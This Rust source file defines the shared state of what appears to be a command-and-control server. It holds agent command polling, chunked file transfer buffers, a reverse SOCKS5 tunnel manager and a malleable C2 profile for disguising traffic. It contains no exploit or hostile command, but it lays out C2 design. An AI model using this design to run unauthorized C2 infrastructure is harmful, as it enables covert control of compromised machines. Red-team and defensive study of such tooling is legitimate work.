//! Application state.

use std::collections::HashMap;
use std::sync::Arc;

use cloakcat_protocol::{DerivedKeys, MalleableProfile};
use sqlx::PgPool;
use tokio::sync::{Mutex, Notify};

use crate::tunnel::TunnelManager;

/// In-memory buffer for a chunked upload (CLI → server → agent).
pub struct UploadBuffer {
    /// Chunks indexed by seq number; None = not yet received.
    pub chunks: Vec<Option<Vec<u8>>>,
}

/// In-memory buffer for a chunked download (agent → server → CLI).
pub struct DownloadBuffer {
    /// Chunks indexed by seq number; None = not yet received.
    pub chunks: Vec<Option<Vec<u8>>>,
    pub complete: bool,
}

/// Shared application state (DB pool + command notification + transfer buffers).
#[derive(Clone)]
pub struct AppState {
    pub db: PgPool,
    /// HKDF-derived keys from SHARED_TOKEN (auth + signing).
    pub derived_keys: DerivedKeys,
    pub operator_token: String,
    /// Per-agent notification: poll_command waits, push_command notifies.
    pub cmd_notify: Arc<Mutex<HashMap<String, Arc<Notify>>>>,
    /// Pending upload transfers: transfer_id → buffer.
    pub upload_buffers: Arc<Mutex<HashMap<String, UploadBuffer>>>,
    /// Pending download transfers: transfer_id → buffer.
    pub download_buffers: Arc<Mutex<HashMap<String, DownloadBuffer>>>,
    /// Reverse SOCKS5 tunnel manager.
    pub tunnel_mgr: Arc<Mutex<TunnelManager>>,
    /// Active malleable C2 profile (loaded from MALLEABLE_PROFILE_PATH at startup).
    /// When set, request bodies are decoded and poll responses are encoded
    /// according to the profile's transform chain.
    pub malleable_profile: Option<Arc<MalleableProfile>>,
}

impl AppState {
    /// Get or create a Notify handle for an agent.
    pub async fn get_notify(&self, agent_id: &str) -> Arc<Notify> {
        let mut map = self.cmd_notify.lock().await;
        map.entry(agent_id.to_string())
            .or_insert_with(|| Arc::new(Notify::new()))
            .clone()
    }
}
